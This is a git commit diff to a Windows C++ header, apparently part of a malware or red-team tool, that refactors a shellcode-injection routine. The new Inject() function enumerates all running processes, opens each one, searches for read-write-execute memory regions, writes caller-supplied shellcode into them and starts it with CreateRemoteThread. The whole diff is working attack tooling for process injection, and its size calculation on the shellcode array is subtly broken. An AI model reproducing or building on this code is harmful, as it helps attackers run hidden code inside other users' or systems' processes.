fa303ed5a8ca2ccd9f21cd5c93a6e3957460ffdf
berg <bergb9443@gmail.com>
2025-07-01 18:03:04 -0400

    refatoring the injection part

--- ProcHandler.h
+++ ProcHandler.h
@@ -5,22 +5,22 @@
 #include <deque>
 
 
-struct Process_Info {
+struct PROCESS_INFO {
 	DWORD pid;
 	WCHAR* procName;
-	PVOID mAddress;
+	PVOID address;
 	HANDLE handle;
 	BOOLEAN canInject ;
 } ;
 
-VOID GetProcessesAndDuplicate(std::deque <Process_Info> processesInfo)
-{
-	DWORD procID;
-	WCHAR* procName;
-	HANDLE hProcess;
-	HANDLE duplicatedHandle;
-	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
+VOID Inject(unsigned char shellcode[])
+{
+	LPVOID offset = 0;
+	PROCESS_INFO procInfo = {};
+	MEMORY_BASIC_INFORMATION mbi = {};
+	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	
 	if (hSnap != INVALID_HANDLE_VALUE)
 	{
 		PROCESSENTRY32 procEntry;
@@ -28,63 +28,33 @@ VOID GetProcessesAndDuplicate(std::deque <Process_Info> processesInfo)
 
 		if (Process32First(hSnap, &procEntry))
 		{
-			do
-			{
-				DWORD procID = procEntry.th32ProcessID;
-				hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, procID);
-				if (DuplicateHandle(GetCurrentProcess(),hProcess,GetCurrentProcess(),&duplicatedHandle,0,0,DUPLICATE_SAME_ACCESS)) 
-				{
-					procName = procEntry.szExeFile;
-					std::wcout << L"Process Name : " << procName << "\n";
-					CloseHandle(hProcess);
-					processesInfo.push_back({
-						procID,
-						procName,
-						NULL,
-						duplicatedHandle,
-						false
-					});
-					continue;
-				}
-			} while (Process32Next(hSnap, &procEntry));
-		}
-	}
-	CloseHandle(hSnap);
-}
 
-VOID FindInjectableProcesses(std::deque <Process_Info> processesInfo)
-{
-	for (int i = 0; i < processesInfo.size(); i++) 
-	{
-		LPVOID offset = 0;
-		MEMORY_BASIC_INFORMATION mbi = {};
-		
-		while (VirtualQueryEx(processesInfo[i].handle, offset, &mbi, sizeof(mbi)))
-		{
-			offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
-			if (mbi.Protect == PAGE_EXECUTE_READWRITE &&
-				mbi.State == MEM_COMMIT &&
-				mbi.Type == MEM_PRIVATE)
+			while (Process32Next(hSnap, &procEntry))
 			{
-				processesInfo[i].mAddress = mbi.BaseAddress;
-				processesInfo[i].canInject = true;
-				break;
+				procInfo.pid = procEntry.th32ProcessID;
+				procInfo.procName = procEntry.szExeFile;
+				procInfo.handle = OpenProcess(MAXIMUM_ALLOWED, FALSE, procInfo.pid);
+
+				if (procInfo.handle)
+				{
+					std::wcout << procInfo.procName << "\n";
+					while (VirtualQueryEx(procInfo.handle, offset, &mbi, sizeof(mbi)))
+					{
+						offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
+						if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE)
+						{
+							std::cout << "\tRWX: 0x" << std::hex << mbi.BaseAddress << "\n";
+							WriteProcessMemory(procInfo.handle, mbi.BaseAddress, shellcode, sizeof(shellcode), NULL);
+							CreateRemoteThread(procInfo.handle, NULL, NULL, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, NULL, NULL);
+						}
+					}
+					offset = 0;
+					CloseHandle(procInfo.handle);
+				}
 			}
 		}
 	}
-}
-
-VOID InjectShellcodeIntoProcess(std::deque <Process_Info> processesInfo, unsigned char shellcode[])
-{
-	for (int i = 0; i < processesInfo.size(); i++)
-	{
-		if (processesInfo[i].canInject)
-		{
-			WriteProcessMemory(processesInfo[i].handle, processesInfo[i].mAddress, shellcode, sizeof(shellcode), NULL);
-			CreateRemoteThread(processesInfo[i].handle, NULL, 0, (LPTHREAD_START_ROUTINE)processesInfo[i].mAddress, NULL, 0, NULL);
-			break;
-		}
-	}
+	CloseHandle(hSnap);
 }
 
 
